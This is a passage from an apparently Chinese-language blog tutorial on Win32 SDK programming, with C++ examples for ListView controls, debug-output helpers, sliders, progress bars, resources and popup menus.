LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hMain, SW_SHOW);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">_stprintf_s(C_MAX, _T(<span class="string">&quot;账号或密码错误，请确认！\n\t账号：%s\n\t密码：%s&quot;</span>), c_User, c_Passwd);</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, C_MAX, <span class="string">L&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1. 先获取小结构体中的信息，做大致判断</span></span><br><span class="line">LPNMHDR pNm = (LPNMHDR)lParam;</span><br><span class="line"><span class="keyword">if</span> (pNm-&gt;idFrom == IDC_LIST3 &amp;&amp; pNm-&gt;code == NM_CLICK)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, Message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、SDK详解"><a href="#三、SDK详解" class="headerlink" title="三、SDK详解"></a>三、SDK详解</h1><h2 id="常用字符串处理函数"><a href="#常用字符串处理函数" class="headerlink" title="常用字符串处理函数"></a>常用字符串处理函数</h2><div class="table-container"><table><thead><tr><th></th><th>ASCLL版</th><th>UNICODE版</th><th>T版</th></tr></thead><tbody><tr><td>获取长度</td><td>strlen</td><td>wcsnlen</td><td>_tcslen</td></tr><tr><td>字符串拷贝</td><td>strcpy_s</td><td>wcscpy_s</td><td>_tcscpy_s</td></tr><tr><td>字符转数字</td><td>atoi</td><td>_wtoi</td><td>_tstoi</td></tr><tr><td>字符转数字</td><td>sscanf_s</td><td>swscanf_s</td><td>_stscanf_s</td></tr><tr><td>数字转字符</td><td>sprintf_s</td><td>swprintf_s</td><td>_stprintf_s</td></tr></tbody></table></div><h2 id="调试输出"><a href="#调试输出" class="headerlink" title="调试输出"></a>调试输出</h2><p>变参函数，用于在输出款输出信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) </span><br><span class="line">&#123;</span><br><span class="line">  TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">  va_list argprt;</span><br><span class="line">  <span class="built_in">va_start</span>(argprt, format);</span><br><span class="line">  <span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line">  <span class="built_in">wvsprintf</span>(buffer, format, argprt);</span><br><span class="line">  <span class="built_in">va_end</span>(argprt);</span><br><span class="line">  <span class="comment">//将缓冲区信息输出</span></span><br><span class="line">  <span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一天所用例题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) <span class="comment">//变参函数</span></span><br><span class="line">&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MyMessageBox</span><span class="params">(<span class="type">const</span> TCHAR* format, ...)</span> <span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,buffer,_T(<span class="string">&quot;提示&quot;</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyGetErrorInfo</span><span class="params">(LPCTSTR lpErrInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unErrCode,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unLine)</span> <span class="comment">// unLine=__LINE__</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPTSTR lpMsgBuf = <span class="literal">nullptr</span>;</span><br><span class="line">WCHAR  szMessage[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR  szCaption[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FormatMessage</span>(<span class="number">0x1300</span>, <span class="literal">NULL</span>, unErrCode,</span><br><span class="line"><span class="number">0x400</span>, (LPTSTR)&amp;lpMsgBuf, <span class="number">64</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szMessage, <span class="number">128</span>,</span><br><span class="line"><span class="string">L&quot;Error_0x%08X:%s&quot;</span>, unErrCode, lpMsgBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szCaption, <span class="number">32</span>,</span><br><span class="line"><span class="string">L&quot;%s (Error Line:%05d)&quot;</span>, lpErrInfo, unLine);</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szMessage, szCaption, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR  lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;你好 呵呵&quot;</span>));</span><br><span class="line"></span><br><span class="line">_trace(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MyMessageBox</span>(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetStdHandle(STD_OUTPUT_HANDLE);</span></span><br><span class="line">HANDLE hOut = <span class="built_in">GetStdHandle</span>(<span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> nError = <span class="built_in">GetLastError</span>();</span><br><span class="line">nError = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">MyGetErrorInfo</span>(<span class="string">L&quot;十五派友情提示&quot;</span>, nError, __LINE__);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>常用数据类型</p><div class="table-container"><table><thead><tr><th>Windows 数据类型</th><th>描述信息</th></tr></thead><tbody><tr><td>UINT</td><td>无符号32位整数</td></tr><tr><td>DWORD</td><td>整数</td></tr><tr><td>PDWORD</td><td>指向32位值的指针</td></tr><tr><td>BOOL</td><td>布尔（true/false）</td></tr><tr><td>SHORT</td><td>带符号16位整数</td></tr><tr><td>LPSTR</td><td>字符串指针</td></tr><tr><td>LPCSTR</td><td>字符串常量指针</td></tr><tr><td>WPARAM</td><td>32位的消息参数</td></tr><tr><td>LPARAM</td><td>32位的消息参数</td></tr><tr><td>LRESULT</td><td>32位函数返回值</td></tr><tr><td>HWND</td><td>窗口句柄</td></tr></tbody></table></div><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="标准控件"><a href="#标准控件" class="headerlink" title="标准控件"></a>标准控件</h3><p>响应消息：WM_COMMAND</p><p>控件时常见的窗口上的交互元素</p><p>当控件的特定功能被触发后，会主动发消息通知父窗口</p><p>父窗口可以通过发消息给控件</p><p>例如：控件的创建（button时按钮控件）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;控件名&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>标准控件时windows提供的基本控件，使用方式也比较简单，一下时常用的标准控件</p><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件名</th><th>英文</th></tr></thead><tbody><tr><td>“button”</td><td>按钮</td><td>Button</td></tr><tr><td>“button”</td><td>复选框</td><td>CheckBox</td></tr><tr><td>“button”</td><td>单选框</td><td>RadioButton</td></tr><tr><td>“static”</td><td>静态文本</td><td>Static Text</td></tr><tr><td>“static”</td><td>图片</td><td>Picture Control</td></tr><tr><td>“combobox”</td><td>复合框</td><td>ComBox</td></tr><tr><td>“edit”</td><td>编辑</td><td>Edit</td></tr><tr><td><strong>“listbox”</strong></td><td><strong>列表框</strong></td><td><strong>ListBox</strong></td></tr></tbody></table></div><p>滚动条 Slider Control控件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_HSCROLL:<span class="comment">//当水平的滑块滑动时，会产生这个消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 先获取滑块的句柄</span></span><br><span class="line">HWND hSlider = <span class="built_in">GetDlgItem</span>(hWnd, IDC_SLIDER1);</span><br><span class="line"><span class="comment">//2. 给滑块发消息 接收滑块移动的位置</span></span><br><span class="line">nPos = <span class="built_in">SendMessage</span>(hSlider, TBM_GETPOS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给滑块发消息，滑块句柄， 消息类型，   重绘，进度位置</span></span><br><span class="line"><span class="comment">//SendMessage(hSlider, TBM_SETPOS, true, 0);</span></span><br></pre></td></tr></table></figure><p>进度条</p><p>响应的还是WM_COMMAND消息，这个消息的WPARAM的低位时控件ID</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 获取进度条控件的句柄</span></span><br><span class="line">HWND hProcess = <span class="built_in">GetDlgItem</span>(hWnd, IDC_PROGRESS1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 给进度条控件发消息，设置进度</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hProcess, PBM_SETPOS, nPos, <span class="number">0</span>);</span><br><span class="line">nPos += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (nPos&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">nPos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用控件"><a href="#通用控件" class="headerlink" title="通用控件"></a>通用控件</h3><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件</th></tr></thead><tbody><tr><td>WC_LISTVIEW</td><td>列表框控件</td></tr><tr><td>WC_TREEVIEW</td><td>树控件</td></tr><tr><td>WC_TABCONTROL</td><td>Tab控件</td></tr><tr><td>HOTLEY_CLASS</td><td>热键控件</td></tr></tbody></table></div><p>列表框控件的创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据ID获取列表框控件的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="comment">//更改列表框的风格</span></span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="窗口风格"><a href="#窗口风格" class="headerlink" title="窗口风格"></a>窗口风格</h2><p>响应消息：WM_NOTIFY</p><p>窗口标准风格之</p><h3 id="三大窗口风格"><a href="#三大窗口风格" class="headerlink" title="三大窗口风格"></a>三大窗口风格</h3><div class="table-container"><table><thead><tr><th>重叠窗口</th><th>弹出窗口</th><th>子窗口</th></tr></thead><tbody><tr><td>WS_OVERLAPPEDWINODW</td><td>WS_POPUPWINDOW</td><td>WS_CHILDWINDOW</td></tr></tbody></table></div><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><div class="table-container"><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>CreateWindow</td><td>使用窗口类，创建窗口，创建控件</td></tr><tr><td>RegisterClass</td><td>注册窗口类</td></tr><tr><td>DialogBox</td><td>使用资源创建一个模态对话框</td></tr><tr><td>MoveWindow</td><td>移动窗口到指定位置</td></tr><tr><td>ShowWIndow</td><td>隐藏（SW_HWID）或显示(SW_SHOW)窗口</td></tr><tr><td>GetWindowText</td><td>获取窗口标题</td></tr><tr><td>SetWindowText</td><td>设置窗口标题</td></tr><tr><td>SetParent</td><td>更改指定窗口的父窗口</td></tr><tr><td>TrackPopupMeun</td><td>弹出菜单（坐标需要转换，需要获取子菜单的句柄）</td></tr><tr><td>GetSubMenu</td><td>获取指定子菜单的句柄</td></tr><tr><td>GetDlgItem</td><td>根据控件的ID获取子控件句柄</td></tr><tr><td>GetParent</td><td>获取父窗口句柄</td></tr><tr><td>FindWindow</td><td>找到一个窗口，获取其句柄</td></tr><tr><td></td></tr></tbody></table></div><h2 id="常用资源"><a href="#常用资源" class="headerlink" title="常用资源"></a>常用资源</h2><p>想要操作资源需先获得资源的句柄</p><h3 id="图标-Icon"><a href="#图标-Icon" class="headerlink" title="图标 Icon"></a>图标 Icon</h3><ul><li>需要有一个图标资源</li><li>LoadIcon根据资源ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h3 id="光标-Cursor"><a href="#光标-Cursor" class="headerlink" title="光标 Cursor"></a>光标 Cursor</h3><ul><li>需要有一个光标资源</li><li>LoadCursor根据ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><ul><li>配合picture控件使用</li></ul><h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><ul><li>下拉菜单<ul><li>有一个菜单资源<ul><li>填充到窗口类中 直接填</li><li>填充到创建窗口的参数上，需要LoadMenu获取到句柄</li></ul></li></ul></li><li>弹出菜单<ul><li>TrackPopupMenu 提供坐标以及菜单的句柄</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这里得到的是窗口坐标</span></span><br><span class="line">DWORD dwX = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">DWORD dwY = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="comment">//我们需要将窗口坐标转换为屏幕坐标</span></span><br><span class="line">POINT pt = &#123; dwX ,dwY &#125;;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hWnd, &amp;pt);</span><br><span class="line">    </span><br><span class="line">HMENU hMenu =  <span class="built_in">LoadMenu</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDR_MENU2));</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取子菜单的句柄</span></span><br><span class="line">HMENU hSubMenu = <span class="built_in">GetSubMenu</span>(</span><br><span class="line">hMenu, <span class="comment">//父级菜单句柄</span></span><br><span class="line"><span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(</span><br><span class="line">hSubMenu,</span><br><span class="line">TPM_LEFTALIGN,</span><br><span class="line">pt.x,</span><br><span class="line">pt.y,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">hWnd,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span 